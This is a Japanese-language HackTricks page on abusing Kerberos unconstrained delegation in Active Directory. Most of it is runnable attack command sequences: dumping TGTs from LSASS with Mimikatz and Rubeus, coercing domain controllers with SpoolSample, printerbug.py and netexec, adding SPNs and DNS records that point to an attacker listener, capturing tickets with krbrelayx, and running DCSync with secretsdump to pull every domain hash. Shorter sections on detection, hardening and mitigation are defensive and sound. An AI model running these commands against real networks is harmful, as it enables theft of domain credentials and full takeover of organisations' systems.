# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

これは、Domain Administratorがドメイン内の任意の**Computer**に設定できる機能です。その後、**ユーザーがそのComputerにログインする**たびに、そのユーザーの**TGTのコピーがDCから提供されるTGS内に含めて送信され、LSASSのメモリに保存されます**。そのため、そのマシンでAdministrator権限を持っていれば、**チケットをダンプして、任意のマシンでユーザーになりすます**ことができます。

つまり、Domain Adminが「Unconstrained Delegation」機能を有効にしたComputerにログインし、そのマシンでローカル管理者権限を持っていれば、チケットをダンプして、ドメイン内のどこでもDomain Adminになりすますことができます（ドメインのprivesc）。

この属性を持つ**Computerオブジェクトは**、[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>)属性に[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)が含まれているかを確認することで**見つけられます**。LDAPフィルター「(userAccountControl:1.2.840.113556.1.4.803:=524288)」を使って確認できます。powerviewもこの方法を使用します。

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Administrator（または被害者ユーザー）のチケットを、**Mimikatz** または **Rubeus** を使った [**Pass the Ticket**](pass-the-ticket.md)**.** によりメモリに読み込みます。\
詳細：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team の Unconstrained delegation に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

攻撃者が **「Unconstrained Delegation」が許可されたコンピューターを侵害**できた場合、**Print server** をだまして、そのコンピューターに対して**自動的にログイン**させ、サーバーのメモリに TGT を保存させることができます。\
その後、攻撃者は **Pass the Ticket attack を実行して、**ユーザーである Print server コンピューターアカウントになりすますことができます。

任意のマシンに対して print server をログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample) を使用できます：

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

TGT がドメインコントローラー由来の場合、[**DCSync attack**](acl-persistence-abuse/index.html#dcsync) を実行して、DC からすべてのハッシュを取得できます。\
[**この攻撃の詳細は ired.team を参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

**authentication を強制する**その他の方法はこちらです:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

被害者に **Kerberos** で unconstrained-delegation ホストへ authentication させる coercion primitive なら、ほかのものでも機能します。最新の環境では、到達可能な RPC surface に応じて、従来の PrinterBug flow の代わりに **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN**、または **WebClient/WebDAV** ベースの coercion を使うことが多いです。

### unconstrained delegation を使った user/service account の悪用

Unconstrained delegation は**コンピューターオブジェクトに限定されません**。**user/service account** も `TRUSTED_FOR_DELEGATION` に設定できます。このシナリオでは、そのアカウントが**自身の所有する SPN** に対する Kerberos service ticket を受け取れることが実質的な要件です。

これにより、非常によくある 2 つの攻撃経路が生まれます。

1. unconstrained-delegation **user account** のパスワード/hash を侵害し、同じアカウントに **SPN を追加**する。
2. アカウントにすでに 1 つ以上の SPN が設定されているものの、そのうち 1 つが**古い、または廃止済みのホスト名**を指している場合、欠落している **DNS A record** を再作成するだけで、SPN セットを変更せずに authentication flow を乗っ取れます。<sup>[[8]](#references)</sup>

最小限の Linux flow:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

メモ:

- これは、unconstrained delegation の対象が**サービスアカウント**であり、その認証情報だけを持っていて、ドメイン参加済みホスト上で code execution できない場合に特に有効です。
- 対象ユーザーにすでに**古い SPN**がある場合、AD に新しい SPN を書き込むより、対応する**DNS レコード**を再作成するほうが目立ちにくい可能性があります。
- 最近の Linux 中心の tradecraft では、`addspn.py`、`dnstool.py`、`krbrelayx.py` と、1つの coercion primitive を使います。この一連の攻撃を完了するために、Windows ホストに触れる必要はありません。

### 攻撃者が作成したコンピューターを使った Unconstrained Delegation の悪用

最近のドメインでは、多くの場合 `MachineAccountQuota > 0`（デフォルトは 10）であり、認証済みの任意の principal が最大 N 個のコンピューターオブジェクトを作成できます。さらに、`SeEnableDelegationPrivilege` トークン特権（または同等の権限）を持っていれば、新しく作成したコンピューターを unconstrained delegation を信頼するように設定し、特権システムから受信する TGT を収集できます。<sup>[[1]](#references)</sup>

大まかな流れ:

1) 自分が制御するコンピューターを作成する

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) ドメイン内で偽のホスト名を名前解決できるようにする

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) 攻撃者が制御するコンピューターで Unconstrained Delegation を有効化する

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

なぜこれが機能するのか：unconstrained delegation では、委任が有効なコンピューター上の LSA が、受信した TGT をキャッシュします。DC または特権サーバーをだまして偽のホストに認証させると、そのマシンの TGT が保存され、エクスポートできるようになります。

4) krbrelayx を export モードで起動し、Kerberos の情報を準備する

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) DC/servers に認証を強制させ、偽ホストへ送信させる

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx は、マシンが認証すると ccache ファイルを保存します。たとえば:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) キャプチャした DC マシンの TGT を使用して DCSync を実行する

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

注意事項と要件:

- `MachineAccountQuota > 0` の場合、権限のないユーザーでもコンピューターアカウントを作成できます。それ以外の場合は、明示的な権限が必要です。
- コンピューターアカウントに `TRUSTED_FOR_DELEGATION` を設定するには、`SeEnableDelegationPrivilege`（または domain admin）が必要です。
- DC が FQDN で接続できるよう、偽ホストへの名前解決（DNS A レコード）を確保してください。
- 強制には、利用可能なベクター（PrinterBug/MS-RPRN、EFSRPC/PetitPotam、DFSCoerce、MS-EVEN など）が必要です。可能であれば、DC でこれらを無効にしてください。
- 被害者アカウントに **「アカウントは機密性が高く、委任できない」** のフラグが設定されているか、**Protected Users** のメンバーである場合、転送された TGT はサービスチケットに含まれません。そのため、この手順では再利用可能な TGT を取得できません。<sup>[[9]](#references)</sup>
- 認証を行うクライアントまたはサーバーで **Credential Guard** が有効になっている場合、Windows は **Kerberos unconstrained delegation** をブロックします。そのため、オペレーターの視点では、通常なら有効な強制経路が失敗することがあります。

検知とハードニングの案:

- UAC の `TRUSTED_FOR_DELEGATION` が設定された場合、イベント ID 4741（コンピューターアカウント作成）および 4742/4738（コンピューター/ユーザーアカウント変更）を検知するアラートを設定します。
- ドメインゾーンへの不審な DNS A レコード追加を監視します。
- 予期しないホストからの 4768/4769、および DC から非 DC ホストへの認証が急増していないか監視します。
- `SeEnableDelegationPrivilege` を最小限のアカウントに制限し、可能であれば `MachineAccountQuota=0` に設定し、DC で Print Spooler を無効にします。LDAP signing と channel binding を適用します。

### Mitigation

- DA/Admin のログインを特定のサービスに制限する
- 特権アカウントに「アカウントは機密性が高く、委任できない」を設定する

## References

- [1] [HTB: Delegate — SYSVOL の認証情報 → Targeted Kerberoast → Unconstrained Delegation → DCSync による DA 権限取得](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – 無制限の委任によるドメイン侵害](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME のフォーク)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Active Directory における Unconstrained Delegation](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users セキュリティグループ](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – DC のプリントサーバーと Kerberos delegation によるドメイン侵害](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
